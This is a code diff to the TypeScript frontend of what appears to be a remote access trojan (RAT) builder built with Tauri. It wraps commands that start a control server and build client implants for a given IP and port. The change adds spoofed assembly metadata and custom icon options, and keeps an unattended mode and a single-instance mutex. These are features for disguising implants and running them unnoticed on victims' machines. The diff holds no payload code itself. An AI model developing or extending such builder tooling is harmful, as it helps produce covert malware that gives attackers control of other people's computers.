@@ -1,5 +1,5 @@
 import { invoke } from "@tauri-apps/api/tauri";
-import { RATClient, RATState } from "../../types";
+import { RATClient, RATState, AssemblyInfo } from "../../types";
 
 export const startServerCmd = async (port: string): Promise<string> => {
   return invoke("start_server", { port });
@@ -12,18 +12,22 @@ export const stopServerCmd = async (): Promise<string> => {
 export const buildClientCmd = async (
   ip: string,
   port: string,
-  unattended: boolean,
   mutexEnabled: boolean,
   mutex: string,
-  startup: boolean
+  unattendedMode: boolean,
+  assemblyInfo: AssemblyInfo,
+  enableIcon: boolean,
+  iconPath: string
 ): Promise<void> => {
   return invoke("build_client", {
     ip,
     port,
     mutexEnabled,
     mutex,
-    unattendedMode: unattended,
-    startup,
+    unattendedMode,
+    assemblyInfo,
+    enableIcon,
+    iconPath,
   });
 };
 
